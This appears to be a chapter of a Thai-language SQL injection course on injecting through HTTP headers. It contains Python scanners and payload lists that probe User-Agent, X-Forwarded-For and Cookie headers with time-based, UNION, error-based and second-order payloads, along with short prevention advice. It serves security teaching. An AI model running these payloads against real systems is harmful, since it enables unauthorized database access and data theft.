# Part 069: SQL Injection ผ่าน HTTP Headers

## ภาพรวม

ระบบมักเพิกเพย SQL injection ผ่าน HTTP headers ที่ถูกเก็บไว้ใน database

**ขั้นตอนที่ 1106-1120**

---

## 1106. Headers ที่นิยมเก็บไว้

```python
import requests

# Headers ที่มักถูก INSERT ไว้ใน DB:
INJECTABLE_HEADERS = [
    'User-Agent',          # logging สำหรับ analytics
    'X-Forwarded-For',     # IP tracking, geolocation
    'Referer',             # analytics
    'X-Forwarded-Host',    # virtual hosting
    'X-Real-IP',           # proxy
    'Accept-Language',     # locale
    'Cookie',              # session data
    'CF-Connecting-IP',    # Cloudflare
    'True-Client-IP',      # Akamai
]

def test_header_sqli(url: str):
    payloads = [
        "' OR '1'='1",
        "' OR SLEEP(3)-- -",
        "' UNION SELECT NULL,NULL,NULL-- -",
        "test' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -",
    ]
    
    for header in INJECTABLE_HEADERS:
        for payload in payloads:
            import time
            start = time.time()
            r = requests.get(
                url,
                headers={header: payload},
                timeout=8
            )
            elapsed = time.time() - start
            
            # ตรวจสอบ
            if elapsed > 2.5:
                print(f"[+] Time-based via {header}: {payload[:40]}")
            elif any(e in r.text.lower() for e in ['sql', 'mysql', 'error', 'syntax']):
                print(f"[+] Error via {header}: {payload[:40]}")
```

---

## 1107. User-Agent Injection

```sql
-- เนื้อหาที่แอป vulnerable:
-- app ทำ: INSERT INTO access_log (ip, agent) VALUES ('1.2.3.4', '$userAgent')

-- Payload ใน User-Agent:
Mozilla/5.0', (SELECT 1))-- -

-- UNION-based:
Mozilla/5.0' UNION SELECT 1,2-- -

-- Error-based:
test' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE()))-- -

-- Time-based:
Mozilla/5.0' AND SLEEP(3)-- -

-- Second-order ผ่าน User-Agent:
-- 1. ส่ง User-Agent: test' (inject once, เก็บใน DB)
-- 2. Admin report ดึงข้อมูลและแสดง (trigger)
```

---

## 1108. X-Forwarded-For Injection

```python
import requests

# ระบบมักเก็บ IP address สำหรับ rate limiting / geo
# vulnerable: "INSERT INTO sessions (ip) VALUES ('" . $_SERVER['HTTP_X_FORWARDED_FOR'] . "')"

def xff_injection(url: str):
    payloads = [
        "127.0.0.1' AND SLEEP(3)-- -",
        "1.1.1.1' UNION SELECT 1,@@version,3-- -",
        "192.168.1.1',NOW()) -- -",  # INSERT injection
    ]
    
    for payload in payloads:
        r = requests.get(
            url,
            headers={'X-Forwarded-For': payload},
            timeout=10
        )
        print(f"XFF: {payload[:50]} -> {r.status_code} ({len(r.text)} bytes)")

# Secure วิธี:
def get_real_ip(request):
    """Validate and sanitize IP from XFF header"""
    import ipaddress
    xff = request.headers.get('X-Forwarded-For', '')
    
    for ip_str in xff.split(','):
        ip_str = ip_str.strip()
        try:
            ipaddress.ip_address(ip_str)  # validate IP format
            return ip_str
        except ValueError:
            continue
    
    return request.remote_addr  # fallback to direct connection IP
```

---

## 1109. Cookie Injection

```python
# Cookie injection - เมื่อ app decode cookie แล้วห้อ SQL

import requests
import base64
import json

def test_cookie_sqli(url: str, cookie_name: str):
    # ผ่าน plain string
    r = requests.get(url, cookies={cookie_name: "1' OR '1'='1"}, timeout=5)
    print(f"Plain: {r.status_code}")
    
    # ผ่าน JSON-in-cookie
    payload_json = json.dumps({"id": "1' UNION SELECT 1,2,3-- -"})
    r = requests.get(url, cookies={cookie_name: payload_json}, timeout=5)
    print(f"JSON: {r.status_code}")
    
    # ผ่าน base64-encoded cookie
    payload_b64 = base64.b64encode(b"1' UNION SELECT 1,2,3-- -").decode()
    r = requests.get(url, cookies={cookie_name: payload_b64}, timeout=5)
    print(f"Base64: {r.status_code}")

# Security: อย่าตัดสิน cookie value แบบ trusted data
# เสมอ treat cookie เหมือน untrusted user input
# ใช้ parameterized queries เสมอ
```

---

## สรุป

HTTP Header SQL Injection:
- **User-Agent** - logging analytics
- **X-Forwarded-For** - IP tracking
- **Cookie** - session data
- **Testing** - ส่ง payload ผ่าน headers
- **Prevention** - validate/parameterize ทุก input point

---

*Part 069 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
